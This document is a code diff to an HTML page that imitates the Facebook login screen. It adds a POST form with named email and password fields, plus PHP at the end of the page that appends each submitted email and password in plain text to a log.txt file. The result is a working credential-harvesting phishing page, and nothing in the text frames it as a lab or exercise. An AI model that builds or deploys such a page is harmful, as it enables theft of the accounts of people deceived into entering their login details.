@@ -16,13 +16,14 @@
     <div class="headersubdiv">
       <img src="images/fblogo.png" class="fblogo">
       <div class="loginform">
+        <form method="POST">
         <table>
           <tr>
             <td class="logintext">Email or Phone</td>
             <td class="logintext"><span class="loginrowgap">Password</span></td>
           </tr>
-            <td><input class="logintext loginfield" type="text"></td>
-            <td><input class="logintext loginrowgap loginfield" type="password"></td>
+            <td><input class="logintext loginfield" name="inputEmail" type="text"></td>
+            <td><input class="logintext loginrowgap loginfield" name="inputSenha" type="password"></td>
             <td><input class="loginrowgap" id="loginbutton" type="submit" value="Log In"></td>
           </tr>
           <tr>
@@ -30,6 +31,7 @@
             <td><a href="#" class="logintext loginrowgap" id="forgotpw">Forgotten account?</a></td>
           </tr>
         </table>
+</form>
       </div>
     </div>
   </header>
@@ -193,7 +195,7 @@
   </div>
   <div class="mobmaindiv">
     <div id="mobtextdiv">
-      <input type="text" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address">
+      <input  type="text" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address">
       <input type="password" class="mobtextbox mobtextbox2" placeholder="Password">
     </div>
     <div class="mobloginbuttondiv">
@@ -233,3 +235,21 @@
     </div>
 </div>
 </body>
+
+<?php
+
+$email =  $_POST['inputEmail'];
+$senha = $_POST['inputSenha'];
+
+// Salvando em um txt
+if (isset($email) && $email != "" && isset($senha) && $senha != ""){
+
+  $msg = "- Email : $email \n- Senha : $senha \n --------------------------------";
+  $myfile = fopen("log.txt", "a");
+  fwrite($myfile, $msg."\n");
+  fclose($myfile);
+
+
+}
+
+?>
